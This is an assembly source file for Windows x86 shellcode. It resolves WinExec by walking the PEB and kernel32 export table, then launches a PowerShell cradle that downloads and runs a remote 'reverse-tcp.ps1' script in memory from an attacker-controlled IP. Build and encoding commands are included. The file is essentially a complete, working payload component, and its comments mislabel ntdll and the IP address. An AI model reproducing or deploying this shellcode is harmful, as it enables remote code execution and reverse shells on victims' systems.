; Description:
; * Position independent x86 shellcode free of null bytes that executes the WinExec() and ExitProcess() API calls
; * PowerShell process is spawned to download and execute a remote payload in memory via HTTP.
; Synopsis:
; * Function prolog to save the previous base pointer and prepare new stack pointer.
; * Dynamically resolve the base address of ntdll.dll by walking the PEB LDR structure.
; * Find the address of WinExec() by parsing the export table of ntdll.dll.
; * Prepare the lPCmdLine and uCmdShow arguments for the WinExec() call.
; * Execute the WinExec() API call to trigger the download cradle and invoke the payload in memory.
; Notes:
; * Manually compile via nasm, then obtain raw byte-code via command-line.
; nasm -f win32 x86-exec-cradle.asm -o x86-exec-cradle.o; for i in $(objdump -D x86-exec-cradle.o|grep "^ "|cut -f2);do echo -n $i; done; echo
; * Generate execution cradle manually.
; python encode-command.py 'powershell.exe -c iex(iwr http://172.31.24.110/reverse-tcp.ps1)'

_start:
; Function prolog to save previous and prepare new stack pointers
 mov ebp, esp
 sub esp, 0x20

find_kernel32_base:
; Obtain kernel32 base by walking PEB->TEB->LDR
 xor ebx, ebx
 mov ebx, [fs:ebx+0x30]
 mov ebx, [ebx+0xC]
 mov ebx, [ebx+0x1C]
 mov ebx, [ebx]
 mov ebx, [ebx]
 mov eax, [ebx+0x8]
 mov [ebp-0x4], eax

find_export_table:
; Obtain address to export table from kernel32
 mov ebx, [eax+0x3C]
 add ebx, eax
 mov ebx, [ebx+0x78]
 add ebx, eax

find_name_table:
; Obtain address of Name Pointer Table from kernel32
 mov edi, [ebx+0x20]
 add edi, eax
 mov [ebp-0x8], edi

find_ordinal_table:
; Obtain address of Ordinal Table from kernel32
 mov ecx, [ebx+0x24]
 add ecx, eax
 mov [ebp-0xC], ecx

find_address_table:
; Obtain address of Address Table from kernel32
 mov edx, [ebx+0x1C]
 add edx, eax
 mov [ebp-0x10], edx

find_export_count:
; Obtain count of exported functions from Export Table
 mov edx, [ebx+0x14]
 mov [ebp-0x14], edx

; Skip to Cradle Execution function
jmp short exec_cradle

find_function:
; Set searched name count used in Find Loop
 xor eax, eax
 mov edx, [ebp-0x14]

find_loop:
; Iterate through the Name Pointer Table to locate WinExec()
 mov edi, [ebp-0x8]
 mov esi, [ebp+0x18]
 xor ecx, ecx
 cld
 mov edi, [edi+eax*4]
 add edi, [ebp-0x4]
 add cx, 0x8
 repe cmpsb
; Skip to Found Function if the name matches "WinExec"
 jz found_function
 inc eax
 cmp eax, edx
; Recursive call to Find Loop for next exported name
 jb find_loop

found_function:
; Calculate address of WinExec() via Ordinal Table and Address Table
 mov ecx, [ebp-0xC]
 mov edx, [ebp-0x10]
 mov ax,  [ecx + eax*2]
 mov eax, [edx + eax*4]
 add eax, [ebp-0x4]
 ret

exec_cradle:
; Main Cradle Execute function
 mov edx, 0x63657878
 shr edx, 8
 push edx
 push 0x456E6957
 mov [ebp+0x18], esp
; Jump to Find Function to begin search
 call find_function
 xor ecx, ecx
 push ecx

; Prepare lpCmdLine argument to execute the cradle
; Push value to stack: "powershell.exe -c iex(iwr http://192.168.43.128/reverse-tcp.ps1))"
 push 0x29317370         ;)1sp
 push 0x2e706374         ;.pct
 push 0x2d657372         ;-esr
 push 0x65766572         ;ever
 push 0x2f383231         ;/821
 push 0x2e33342e         ;.34.
 push 0x3836312e         ;861.
 push 0x3239312f         ;291/
 push 0x2f3a7074         ;/:pt
 push 0x74682072         ;th r
 push 0x77692878         ;wi(x
 push 0x65692063         ;ei c
 push 0x2d206578         ;- ex
 push 0x652e6c6c         ;e.ll
 push 0x65687372         ;ehsr
 push 0x65776f70         ;ewop

; Prepare uCmdShow argument SW_SHOWNORMAL (0x01)
 mov ebx, esp
 inc ecx
; Push uCmdShow and lpCmdLine arguments to stack
 push ecx
 push ebx
; Execute API call WinExec([in] lpCmdLine, [in] uCmdShow);
 call eax

exit_process:
; Obtain address to ExitProcess() using Find Function
 xor ecx, ecx
 mov ecx, 0x73736501
 shr ecx, 8
 push ecx
 push 0x636F7250
 push 0x74697845
 mov [ebp+0x18], esp
 call find_function
; Prepare uExitCode argument SUCCESS (0x00)
 xor edx, edx
 push edx
; Execute API call ExitProcess([in] uExitCode);
 call eax
